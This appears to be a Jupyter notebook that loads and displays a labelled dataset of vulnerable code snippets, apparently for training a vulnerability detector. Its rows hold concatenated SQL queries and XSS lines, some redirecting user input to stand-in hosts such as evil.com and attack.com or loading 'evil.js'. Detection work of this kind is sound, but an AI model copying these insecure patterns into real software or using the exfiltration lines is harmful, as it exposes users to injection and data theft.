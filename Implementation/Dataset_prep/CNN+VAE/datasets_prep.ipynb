{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "code_vul = pd.read_csv(\"../Datasets/code_vulnerabilities.csv\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Code Snippet",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Vulnerability Type",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Location",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Preprocessed Tokens",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "385ea07e-7b6c-4990-9d53-94bc601baf7b",
       "rows": [
        [
         "0",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "8",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "1",
         "alert('Hello ' + user_input);",
         "XSS",
         "19",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "2",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "2",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "3",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "14",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "4",
         "db.execute('SELECT * FROM employees WHERE id = ' + user_input)",
         "SQLi",
         "17",
         "[\"db.execute('SELECT\", '*', 'FROM', 'employees', 'WHERE', 'id', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "5",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "10",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "6",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "10",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "7",
         "alert('Hello ' + user_input);",
         "XSS",
         "16",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "8",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "13",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "9",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "13",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "10",
         "db.execute('SELECT * FROM employees WHERE id = ' + user_input)",
         "SQLi",
         "10",
         "[\"db.execute('SELECT\", '*', 'FROM', 'employees', 'WHERE', 'id', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "11",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "12",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "12",
         "db.execute('SELECT * FROM employees WHERE id = ' + user_input)",
         "SQLi",
         "6",
         "[\"db.execute('SELECT\", '*', 'FROM', 'employees', 'WHERE', 'id', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "13",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "19",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "14",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "3",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "15",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "10",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "16",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "5",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "17",
         "connection.query('SELECT * FROM users WHERE username = ' + input_string)",
         "SQLi",
         "10",
         "[\"connection.query('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'input_string)']"
        ],
        [
         "18",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "1",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "19",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "20",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "20",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "8",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "21",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "20",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "22",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "16",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "23",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "5",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "24",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "3",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "25",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "13",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "26",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "11",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "27",
         "connection.query('SELECT * FROM users WHERE username = ' + input_string)",
         "SQLi",
         "7",
         "[\"connection.query('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'input_string)']"
        ],
        [
         "28",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "15",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "29",
         "connection.query('SELECT * FROM users WHERE username = ' + input_string)",
         "SQLi",
         "9",
         "[\"connection.query('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'input_string)']"
        ],
        [
         "30",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "12",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "31",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "6",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "32",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "12",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "33",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "3",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "34",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "9",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "35",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "20",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "36",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "10",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "37",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "7",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "38",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "2",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "39",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "6",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "40",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "5",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "41",
         "alert('Hello ' + user_input);",
         "XSS",
         "3",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "42",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "16",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "43",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "12",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "44",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "11",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "45",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "17",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "46",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "3",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "47",
         "alert('Hello ' + user_input);",
         "XSS",
         "1",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "48",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "9",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "49",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "16",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ]
       ],
       "shape": {
        "columns": 4,
        "rows": 1000
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Code Snippet</th>\n",
       "      <th>Vulnerability Type</th>\n",
       "      <th>Location</th>\n",
       "      <th>Preprocessed Tokens</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>cursor.execute('SELECT * FROM users WHERE user...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>8</td>\n",
       "      <td>[\"cursor.execute('SELECT\", '*', 'FROM', 'users...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>19</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>2</td>\n",
       "      <td>['document.location', '=', \"'http://evil.com?u...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>query = 'SELECT * FROM customers WHERE email =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>14</td>\n",
       "      <td>['query', '=', \"'SELECT\", '*', 'FROM', 'custom...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>db.execute('SELECT * FROM employees WHERE id =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>17</td>\n",
       "      <td>[\"db.execute('SELECT\", '*', 'FROM', 'employees...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>995</th>\n",
       "      <td>db.execute('SELECT * FROM products WHERE produ...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>12</td>\n",
       "      <td>[\"db.execute('SELECT\", '*', 'FROM', 'products'...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>996</th>\n",
       "      <td>connection.query('SELECT * FROM users WHERE us...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>9</td>\n",
       "      <td>[\"connection.query('SELECT\", '*', 'FROM', 'use...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>997</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>16</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>998</th>\n",
       "      <td>query = 'SELECT * FROM customers WHERE email =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>17</td>\n",
       "      <td>['query', '=', \"'SELECT\", '*', 'FROM', 'custom...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>999</th>\n",
       "      <td>query = 'SELECT * FROM customers WHERE email =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>12</td>\n",
       "      <td>['query', '=', \"'SELECT\", '*', 'FROM', 'custom...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1000 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                          Code Snippet Vulnerability Type  \\\n",
       "0    cursor.execute('SELECT * FROM users WHERE user...               SQLi   \n",
       "1                        alert('Hello ' + user_input);                XSS   \n",
       "2    document.location = 'http://evil.com?username=...                XSS   \n",
       "3    query = 'SELECT * FROM customers WHERE email =...               SQLi   \n",
       "4    db.execute('SELECT * FROM employees WHERE id =...               SQLi   \n",
       "..                                                 ...                ...   \n",
       "995  db.execute('SELECT * FROM products WHERE produ...               SQLi   \n",
       "996  connection.query('SELECT * FROM users WHERE us...               SQLi   \n",
       "997                      alert('Hello ' + user_input);                XSS   \n",
       "998  query = 'SELECT * FROM customers WHERE email =...               SQLi   \n",
       "999  query = 'SELECT * FROM customers WHERE email =...               SQLi   \n",
       "\n",
       "     Location                                Preprocessed Tokens  \n",
       "0           8  [\"cursor.execute('SELECT\", '*', 'FROM', 'users...  \n",
       "1          19         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "2           2  ['document.location', '=', \"'http://evil.com?u...  \n",
       "3          14  ['query', '=', \"'SELECT\", '*', 'FROM', 'custom...  \n",
       "4          17  [\"db.execute('SELECT\", '*', 'FROM', 'employees...  \n",
       "..        ...                                                ...  \n",
       "995        12  [\"db.execute('SELECT\", '*', 'FROM', 'products'...  \n",
       "996         9  [\"connection.query('SELECT\", '*', 'FROM', 'use...  \n",
       "997        16         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "998        17  ['query', '=', \"'SELECT\", '*', 'FROM', 'custom...  \n",
       "999        12  ['query', '=', \"'SELECT\", '*', 'FROM', 'custom...  \n",
       "\n",
       "[1000 rows x 4 columns]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "code_vul"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
